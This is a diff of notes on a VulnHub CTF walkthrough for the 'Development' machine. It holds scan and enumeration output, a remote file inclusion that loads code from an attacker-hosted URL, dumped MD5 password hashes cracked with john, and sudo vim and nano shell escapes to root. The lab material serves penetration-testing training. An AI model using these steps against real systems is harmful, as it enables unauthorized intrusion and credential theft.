@@ -1,4 +1,4 @@
-https://www.hackingarticles.in/development-vulnhub-walkthrough/
+<https://www.hackingarticles.in/development-vulnhub-walkthrough/>
 
 
 This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. 
@@ -29,12 +29,12 @@ Modification file /etc/netplan/50-cloud-init.yaml
         version: 2
 
 
-└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.19
+└─$ sudo nmap -sT -A -Pn -n -p- 192.168.56.107
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 07:47 CEST
 Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 80.00% done; ETC: 07:48 (0:00:23 remaining)
-Nmap scan report for 192.168.110.19
+Nmap scan report for 192.168.56.107
 Host is up (0.00052s latency).
 Not shown: 65530 closed ports
 PORT     STATE SERVICE     VERSION
@@ -101,7 +101,7 @@ PORT     STATE SERVICE     VERSION
 |     <p>Your browser sent a request that this server could not understand.<br />
 |     </p>
 |     <hr>
-|     <address>IIS 6.0 Server at 192.168.110.19 Port 8080</address>
+|     <address>IIS 6.0 Server at 192.168.56.107 Port 8080</address>
 |_    </body></html>
 |_http-open-proxy: Proxy might be redirecting requests
 |_http-server-header: IIS 6.0
@@ -169,10 +169,10 @@ Host script results:
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.51 ms 192.168.110.19
+1   0.51 ms 192.168.56.107
 
 
-└─$ curl http://192.168.110.19:8080/html_pages                                  
+└─$ curl http://192.168.56.107:8080/html_pages                                  
 -rw-r--r-- 1 www-data www-data      285 Sep 26 17:46 about.html
 -rw-r--r-- 1 www-data www-data     1049 Sep 26 17:51 config.html
 -rw-r--r-- 1 www-data www-data      199 Jul 23 15:37 default.html
@@ -188,13 +188,13 @@ HOP RTT     ADDRESS
 
 
 
-└─$ enum4linux -a 192.168.110.19
+└─$ enum4linux -a 192.168.56.107
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 17 07:59:09 2021
 
  ========================== 
 |    Target Information    |
  ========================== 
-Target ........... 192.168.110.19
+Target ........... 192.168.56.107
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
@@ -202,14 +202,14 @@ Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 
  ====================================================== 
-|    Enumerating Workgroup/Domain on 192.168.110.19    |
+|    Enumerating Workgroup/Domain on 192.168.56.107    |
  ====================================================== 
 [+] Got domain/workgroup name: WORKGROUP
 
  ============================================== 
-|    Nbtstat Information for 192.168.110.19    |
+|    Nbtstat Information for 192.168.56.107    |
  ============================================== 
-Looking up status of 192.168.110.19
+Looking up status of 192.168.56.107
         DEVELOPMENT     <00> -         B <ACTIVE>  Workstation Service
         DEVELOPMENT     <03> -         B <ACTIVE>  Messenger Service
         DEVELOPMENT     <20> -         B <ACTIVE>  File Server Service
@@ -219,37 +219,37 @@ Looking up status of 192.168.110.19
         MAC Address = 00-00-00-00-00-00
 
  ======================================= 
-|    Session Check on 192.168.110.19    |
+|    Session Check on 192.168.56.107    |
  ======================================= 
-[+] Server 192.168.110.19 allows sessions using username '', password ''
+[+] Server 192.168.56.107 allows sessions using username '', password ''
 
  ============================================= 
-|    Getting domain SID for 192.168.110.19    |
+|    Getting domain SID for 192.168.56.107    |
  ============================================= 
 Domain Name: WORKGROUP
 Domain Sid: (NULL SID)
 [+] Can't determine if host is part of domain or part of a workgroup
 
  ======================================== 
-|    OS information on 192.168.110.19    |
+|    OS information on 192.168.56.107    |
  ======================================== 
 Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
-[+] Got OS info for 192.168.110.19 from smbclient: 
-[+] Got OS info for 192.168.110.19 from srvinfo:
+[+] Got OS info for 192.168.56.107 from smbclient: 
+[+] Got OS info for 192.168.56.107 from srvinfo:
         DEVELOPMENT    Wk Sv PrQ Unx NT SNT development server (Samba, Ubuntu)
         platform_id     :       500
         os version      :       6.1
         server type     :       0x809a03
 
  =============================== 
-|    Users on 192.168.110.19    |
+|    Users on 192.168.56.107    |
  =============================== 
 index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: intern   Name:   Desc: 
 
 user:[intern] rid:[0x3e8]
 
  =========================================== 
-|    Share Enumeration on 192.168.110.19    |
+|    Share Enumeration on 192.168.56.107    |
  =========================================== 
 
         Sharename       Type      Comment
@@ -259,15 +259,15 @@ user:[intern] rid:[0x3e8]
         IPC$            IPC       IPC Service (development server (Samba, Ubuntu))
 SMB1 disabled -- no workgroup available
 
-[+] Attempting to map shares on 192.168.110.19
-//192.168.110.19/print$ Mapping: DENIED, Listing: N/A
-//192.168.110.19/access Mapping: DENIED, Listing: N/A
-//192.168.110.19/IPC$   [E] Can't understand response:
+[+] Attempting to map shares on 192.168.56.107
+//192.168.56.107/print$ Mapping: DENIED, Listing: N/A
+//192.168.56.107/access Mapping: DENIED, Listing: N/A
+//192.168.56.107/IPC$   [E] Can't understand response:
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 
 
  ========================================================================= 
-|    Users on 192.168.110.19 via RID cycling (RIDS: 500-550,1000-1050)    |
+|    Users on 192.168.56.107 via RID cycling (RIDS: 500-550,1000-1050)    |
  ========================================================================= 
 [I] Found new SID: S-1-22-1
 [I] Found new SID: S-1-5-21-779411179-1483911247-3630892801
@@ -300,7 +300,7 @@ S-1-5-21-779411179-1483911247-3630892801-1000 DEVELOPMENT\intern (Local User)
 
 
 
-└─$ dirb http://192.168.110.19:8080
+└─$ dirb http://192.168.56.107:8080
 
 -----------------
 DIRB v2.22    
@@ -308,25 +308,25 @@ By The Dark Raver
 -----------------
 
 START_TIME: Sat Apr 17 08:01:50 2021
-URL_BASE: http://192.168.110.19:8080/
+URL_BASE: http://192.168.56.107:8080/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612                                                          
 
----- Scanning URL: http://192.168.110.19:8080/ ----
-+ http://192.168.110.19:8080/_vti_bin (CODE:200|SIZE:154)
-+ http://192.168.110.19:8080/_vti_cnf (CODE:200|SIZE:154)
-+ http://192.168.110.19:8080/_vti_pvt (CODE:200|SIZE:154)
-+ http://192.168.110.19:8080/about (CODE:200|SIZE:936)
-==> DIRECTORY: http://192.168.110.19:8080/aspnet_client/
-+ http://192.168.110.19:8080/development (CODE:200|SIZE:576)
-+ http://192.168.110.19:8080/error (CODE:200|SIZE:29)
-+ http://192.168.110.19:8080/index.html (CODE:200|SIZE:560)
-+ http://192.168.110.19:8080/root (CODE:200|SIZE:144)
-+ http://192.168.110.19:8080/server-status (CODE:403|SIZE:289)
----- Entering directory: http://192.168.110.19:8080/aspnet_client/ ----
+---- Scanning URL: http://192.168.56.107:8080/ ----
++ http://192.168.56.107:8080/_vti_bin (CODE:200|SIZE:154)
++ http://192.168.56.107:8080/_vti_cnf (CODE:200|SIZE:154)
++ http://192.168.56.107:8080/_vti_pvt (CODE:200|SIZE:154)
++ http://192.168.56.107:8080/about (CODE:200|SIZE:936)
+==> DIRECTORY: http://192.168.56.107:8080/aspnet_client/
++ http://192.168.56.107:8080/development (CODE:200|SIZE:576)
++ http://192.168.56.107:8080/error (CODE:200|SIZE:29)
++ http://192.168.56.107:8080/index.html (CODE:200|SIZE:560)
++ http://192.168.56.107:8080/root (CODE:200|SIZE:144)
++ http://192.168.56.107:8080/server-status (CODE:403|SIZE:289)
+---- Entering directory: http://192.168.56.107:8080/aspnet_client/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
 -----------------
@@ -336,7 +336,7 @@ DOWNLOADED: 4612 - FOUND: 9
 
 
 
-└─$ curl http://192.168.110.19:8080/development
+└─$ curl http://192.168.56.107:8080/development
 Under development we have a variety of projects.
 
 /test.pcap: a simple bash script that allows Director, from the comfort of his desk, to be routinely fed network information. He can then employ a scraper to download the .pcap files to view at his own convenience.
@@ -349,7 +349,7 @@ The question is, do you know what to do? Try harder!
 
 
 
-└─$ curl http://192.168.110.19:8080/development.html
+└─$ curl http://192.168.56.107:8080/development.html
 <html>
 <head><title>Security by Obscurity: The Path to DEVELOPMENTSECRETPAGE.</title>
 </head>
@@ -373,7 +373,7 @@ Hence, I shall secretly write in pages to guide hackers to make Patrick learn hi
 <!-- You tried harder! Visit ./developmentsecretpage. -->
 
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/
 <html>
 <head>
 <title>Welcome to Good Tech</title>
@@ -393,7 +393,7 @@ This is the property of Good Tech. All rights reserved.
 </body>
 </html>
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/patrick.php
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/patrick.php
 <html>
 <head>
 <title>Page title</title>
@@ -422,7 +422,7 @@ This is the property of Good Tech. All rights reserved.
 
 
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/sitemap.php
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/sitemap.php
 <html>
 <head>
 <title>A Map of the Development Network -- the Brains of Good Tech</title>
@@ -453,7 +453,7 @@ This is the property of Good Tech. All rights reserved.
 
 
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/securitynotice.php                                                                                                          130 ⨯
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/securitynotice.php
 <html>
 <head>
 <title>Security Notice</title>
@@ -483,7 +483,7 @@ This is the property of Good Tech. All rights reserved.
 </body>
 </html>
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/directortestpagev1.php
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/directortestpagev1.php
 <html>
 <head>
 <title>Director's Update Panel Version 1.0</title>
@@ -517,7 +517,7 @@ This is the property of Good Tech. All rights reserved.
 
 
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/directortestpagev1.php?logout=1
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/directortestpagev1.php?logout=1
 <html>
 <head>
 <title>Director's Update Panel Version 1.0</title>
@@ -537,18 +537,18 @@ This is the property of Good Tech. All rights reserved.
 Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
 Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
 
-
+https://www.exploit-db.com/exploits/7444
 http://www.example.com/[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell] 
 
 
 Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.110.1:8888/cmd.txt
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=slog_users.txt 
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.56.1:8000/info.php
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=slog_users.txt 
 
 
 
-└─$ curl http://192.168.110.19:8080/developmentsecretpage/slog_users.txt 
+└─$ curl http://192.168.56.107:8080/developmentsecretpage/slog_users.txt 
 admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
 intern, 4a8a2b374f463b7aedbb44a066363b81
 patrick, 87e6d56ce79af90dbe07d387d3d0579e
@@ -562,6 +562,8 @@ intern	:	4a8a2b374f463b7aedbb44a066363b81	12345678900987654321
 patrick	:	87e6d56ce79af90dbe07d387d3d0579e	P@ssw0rd25
 qiu	:	ee64497098d0926d198f54f6d5431f98	qiu 
 
+
+john --format=raw-md5 hash.txt
 
 S-1-22-1-1000 Unix User\admin (Local User)
 S-1-22-1-1001 Unix User\patrick (Local User)
@@ -577,7 +579,7 @@ intern:~$ os.system('/bin/bash')
 intern@development:~$ id
 uid=1002(intern) gid=1006(intern) groups=1006(intern)
 intern@development:~$ env
-SSH_CONNECTION=192.168.110.20 46394 192.168.110.19 22
+SSH_CONNECTION=192.168.110.20 46394 192.168.56.107 22
 LANG=en_US.UTF-8
 OLDPWD=/home/intern
 XDG_SESSION_ID=7
@@ -612,6 +614,12 @@ User patrick may run the following commands on development:
 patrick@development:/home/intern$ sudo /usr/bin/vim
 [sudo] password for patrick: P@ssw0rd25 
 :shell
+
+patrick@development:/home/intern$ sudo /bin/nano
+^R^X
+reset; sh 1>&0 2>&0
+
+
 root@development:~# id
 uid=0(root) gid=0(root) groups=0(root)
 
